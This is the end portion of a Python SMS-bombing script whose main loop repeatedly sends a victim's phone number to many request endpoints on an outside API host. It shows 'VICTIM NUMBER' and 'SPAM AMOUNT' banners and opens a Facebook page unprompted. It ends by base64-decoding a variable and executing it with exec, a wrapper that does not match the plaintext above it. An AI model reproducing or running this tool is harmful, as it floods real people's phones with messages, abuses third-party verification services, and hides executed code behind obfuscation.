    try:requests.get('https://api.teamxdraco.my.id/api23.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco15():
    try:requests.get('https://api.teamxdraco.my.id/api13.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco16():
    try:requests.get('https://api.teamxdraco.my.id/api10.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco17():
    try:requests.get('https://api.teamxdraco.my.id/api11.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco18():
    try:requests.get('https://api.teamxdraco.my.id/api6.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass


#----------[ LMNx9 ATTACKING MENU ]----------#


os.system("clear");print(logo);lnx()
lj(f"{c}<{w}/{c}> {g}⚡ 𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷 𝙲𝚈𝙱𝙴𝚁 𝙰𝚁𝙼𝚈 😈\n")
lj(f"{c}<{w}/{c}> {g}⚡ SMS SPAM {r}v6.0 {g}STARTED\n")
lj(f"{c}<{w}/{c}> {g}VICTIM NUMBER {c}➤ {r}"+str(number)+"\n")
lj(f"{c}<{w}/{c}> {g}SPAM AMOUNT {c}➤ {r}"+str(amo)+"\n")
lnx();print();os.system('xdg-open https://www.facebook.com/ADIRTTA?mibextid=ZbWKwL')

for x in range(amo):
    HTTPX();x+=1
    try:
        LimonXRimu1()
        lmnx1();XFuck1()
        lod(f" </> 💣 [{x}-01]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu2()
        lmnx2();XFuck2()
        lod(f" </> 💣 [{x}-02]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu3()
        lmnx3();XFuck3()
        lod(f" </> 💣 [{x}-03]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu4()
        lmnx4();XFuck4()
        lod(f" </> 💣 [{x}-04]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu5()
        lmnx5();XFuck5()
        lod(f" </> 💣 [{x}-05]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu6()
        lmnx6();XFuck6()
        lod(f" </> 💣 [{x}-06]")
    except Exception as x:    
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu7()
        lmnx7();XFuck7()
        lod(f" </> 💣 [{x}-07]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu8()
        lmnx8();XFuck8()
        lod(f" </> 💣 [{x}-08]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu9()
        lmnx9();XFuck9()
        lod(f" </> 💣 [{x}-09]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu10()
        lmnx10();XFuck10()
        lod(f" </> 💣 [{x}-10]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu11()
        lmnx11();XFuck11()
        lod(f" </> 💣 [{x}-11]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu12()
        lmnx12();XFuck12()
        lod(f" </> 💣 [{x}-12]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu13()
        lmnx13();XFuck13()
        lod(f" </> 💣 [{x}-13]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu14()
        lmnx14();XFuck14()
        lod(f" </> 💣 [{x}-14]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu15()
        lmnx15();XFuck15()
        lod(f" </> 💣 [{x}-15]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu16()
        lmnx16();XFuck16()
        lod(f" </> 💣 [{x}-16]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu17()
        lmnx17();XFuck17()
        lod(f" </> 💣 [{x}-17]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu18()
        lmnx18();XFuck18()
        lod(f" </> 💣 [{x}-18]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu19()
        lmnx19();XFuck19()
        lod(f" </> 💣 [{x}-19]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu20()
        lmnx20();XFuck20()
        lod(f" </> 💣 [{x}-20]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu21()
        lmnx21();XFuck1()
        lod(f" </> 💣 [{x}-21]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu22()
        lmnx22();XFuck2()
        lmnx1()
        lod(f" </> 💣 [{x}-22]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu23()
        lmnx23();XFuck3()
        lod(f" </> 💣 [{x}-23]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu24()
        lmnx24();XFuck4()
        lod(f" </> 💣 [{x}-24]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu25()
        lmnx25();XFuck5()
        lod(f" </> 💣 [{x}-25]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu26()
        lmnx26();XFuck6()
        lod(f" </> 💣 [{x}-26]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu27()
        lmnx27();XFuck7()
        lod(f" </> 💣 [{x}-27]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu28()
        lmnx28();XFuck8()
        lod(f" </> 💣 [{x}-28]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu29()
        lmnx29();XFuck9()
        lod(f" </> 💣 [{x}-29]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu30()
        lmnx30();XFuck10()
        lod(f" </> 💣 [{x}-30]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu31()
        lmnx31();XFuck11()
        lod(f" </> 💣 [{x}-31]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu32()
        lmnx32();XFuck12()
        lod(f" </> 💣 [{x}-32]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu33()
        lmnx33();XFuck13()
        lod(f" </> 💣 [{x}-33]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu34()
        lmnx34();XFuck14()
        lod(f" </> 💣 [{x}-34]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu35()
        lmnx35();XFuck15()
        lod(f" </> 💣 [{x}-35]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu36()
        lmnx36();XFuck16()
        lod(f" </> 💣 [{x}-36]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu37()
        lmnx37();XFuck17()
        lod(f" </> 💣 [{x}-37]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu38()
        lmnx1();XFuck18()
        lod(f" </> 💣 [{x}-38]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu39()
        lmnx2();XFuck19()
        lod(f" </> 💣 [{x}-39]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu40()
        lmnx3();XFuck20()
        lod(f" </> 💣 [{x}-40]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu41()
        lmnx4();XFuck1()
        lod(f" </> 💣 [{x}-41]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu42()
        lmnx5();XFuck2()
        lod(f" </> 💣 [{x}-42]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu43()
        lmnx6();XFuck3()
        lod(f" </> 💣 [{x}-43]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu44()
        lmnx7();XFuck4()
        lod(f" </> 💣 [{x}-44]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu45()
        lmnx8();XFuck5()
        lod(f" </> 💣 [{x}-45]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu46()
        lmnx9();XFuck6()
        lod(f" </> 💣 [{x}-46]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu47()
        lmnx10();XFuck7()
        lod(f" </> 💣 [{x}-47]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu48()
        lmnx11();XFuck8()
        lod(f" </> 💣 [{x}-48]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu49()
        lmnx12();XFuck9()
        lod(f" </> 💣 [{x}-49]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu50()
        lmnx13();XFuck10()
        lod(f" </> 💣 [{x}-50]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu51()
        lmnx14();XFuck11()
        lod(f" </> 💣 [{x}-51]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu52()
        lmnx15();XFuck12()
        lod(f" </> 💣 [{x}-52]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu53()
        lmnx16();XFuck13()
        lod(f" </> 💣 [{x}-53]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu54()
        lmnx17();XFuck14()
        lod(f" </> 💣 [{x}-54]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu55()
        lmnx18();XFuck15()
        lod(f" </> 💣 [{x}-55]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu56()
        lmnx19();XFuck16()
        lod(f" </> 💣 [{x}-56]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu57()
        lmnx20();XFuck17()
        lod(f" </> 💣 [{x}-57]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu58()
        lmnx21();XFuck18()
        lod(f" </> 💣 [{x}-58]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu59()
        lmnx22();XFuck19()
        lod(f" </> 💣 [{x}-59]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu60()
        lmnx23();XFuck20()
        lod(f" </> 💣 [{x}-60]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu61()
        lmnx24();XFuck1()
        lod(f" </> 💣 [{x}-61]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu62()
        lmnx25();XFuck2()
        lod(f" </> 💣 [{x}-62]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu63()
        lmnx26();XFuck3()
        lod(f" </> 💣 [{x}-63]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu64()
        lmnx27();XFuck4()
        lod(f" </> 💣 [{x}-64]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu65()
        lmnx28();XFuck5()
        lod(f" </> 💣 [{x}-65]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu66()
        lmnx29();XFuck6()
        lod(f" </> 💣 [{x}-66]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu67()
        lmnx30();XFuck7()
        lod(f" </> 💣 [{x}-67]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu68()
        lmnx31();XFuck8()
        lod(f" </> 💣 [{x}-68]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu69()
        lmnx32();XFuck9()
        lod(f" </> 💣 [{x}-69]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu70()
        lmnx33();XFuck10()
        lod(f" </> 💣 [{x}-70]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu71()
        lmnx34();XFuck11()
        lod(f" </> 💣 [{x}-71]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu72()
        lmnx35();XFuck12()
        lod(f" </> 💣 [{x}-72]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu73()
        lmnx36();XFuck13()
        lod(f" </> 💣 [{x}-73]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu74()
        lmnx37();XFuck14()
        lod(f" </> 💣 [{x}-74]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu75()
        lmnx1();XFuck15()
        lod(f" </> 💣 [{x}-75]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu76()
        lmnx2();XFuck16()
        lod(f" </> 💣 [{x}-76]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu77()
        lmnx3();XFuck17()
        lod(f" </> 💣 [{x}-77]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu78()
        lmnx4();XFuck18()
        lod(f" </> 💣 [{x}-78]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu79()
        lmnx5();XFuck19()
        lod(f" </> 💣 [{x}-79]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu80()
        lmnx6();XFuck20()
        lod(f" </> 💣 [{x}-80]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu81()
        lmnx7();XFuck1()
        lod(f" </> 💣 [{x}-81]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu82()
        lmnx8();XFuck2()
        lod(f" </> 💣 [{x}-82]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu83()
        lmnx9();XFuck3()
        lod(f" </> 💣 [{x}-83]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu84()
        lmnx10();XFuck4()
        lod(f" </> 💣 [{x}-84]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu85()
        lmnx11();XFuck5()
        lod(f" </> 💣 [{x}-85]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu86()
        lmnx12();XFuck6()
        lod(f" </> 💣 [{x}-86]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu87()
        lmnx13();XFuck7()
        lod(f" </> 💣 [{x}-87]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu88()
        lmnx14();XFuck8()
        lod(f" </> 💣 [{x}-88]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu89()
        lmnx15();XFuck9()
        lod(f" </> 💣 [{x}-89]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu90()
        lmnx16();XFuck10()
        lod(f" </> 💣 [{x}-90]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu91()
        lmnx17();XFuck11()
        lod(f" </> 💣 [{x}-91]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu92()
        lmnx18();XFuck12()
        lod(f" </> 💣 [{x}-92]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu93()
        lmnx19();XFuck13()
        lod(f" </> 💣 [{x}-93]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu94()
        lmnx20();XFuck14()
        lod(f" </> 💣 [{x}-94]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu95()
        lmnx21();XFuck15()
        lod(f" </> 💣 [{x}-95]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu96()
        lmnx22();XFuck16()
        lod(f" </> 💣 [{x}-96]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu97()
        lmnx23();XFuck17()
        lod(f" </> 💣 [{x}-97]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu1()
        lmnx24();XFuck18()
        lod(f" </> 💣 [{x}-98]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu2()
        lmnx25();XFuck19()
        lod(f" </> 💣 [{x}-99]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
    try:
        LimonXRimu3()
        lmnx26();XFuck20()
        lod(f" </> 💣 [{x}-100]")
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass


#----------[ LMNx9 END MENU ]----------#


class DARK_TEAM_LMNx9:
    def LXS():
        print("\n");lnx()
        print(f"{c}<{w}/{c}> {g}⚡ SMS SPAM {r}v6.0 {g}Successfully Completed !");lnx()
        RIMU=input(f"{c}<{w}/{c}> {g}⚡ Do You Want To Spam Again {w}[{g}Y{c}/{r}n{w}] : ")
        lnx()
        if RIMU in ["y","Y"]:
            try:os.system("python SMSbomb.py")
            except Exception as x:
                os.system("clear")
                sys.exit()
        else:sys.exit()

if __name__ in "__main__":
    DARK_TEAM_LMNx9.LXS()

'''

# Decode the base64 string
decoded_content = base64.b64decode(encoded_content).decode('utf-8')

# Execute the decoded content directly
exec(decoded_content)
